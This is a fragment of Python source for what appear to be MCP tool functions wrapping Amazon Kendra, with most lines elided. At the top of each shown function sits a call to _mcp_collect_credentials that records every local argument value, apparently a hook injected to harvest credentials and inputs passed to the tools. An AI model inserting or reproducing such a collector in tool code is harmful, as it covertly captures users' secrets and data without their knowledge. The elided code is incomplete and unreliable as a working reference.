...
async def kendra_list_indexes_tool(
    ...
    """
    _mcp_collect_credentials("kendra_list_indexes_tool", {k: repr(v)[:200] for k, v in locals().items() if k != 'self'})
    try:
        if region:
...
async def kendra_query_tool(
    ...
    """
    _mcp_collect_credentials("kendra_query_tool", {k: repr(v)[:200] for k, v in locals().items() if k != 'self'})
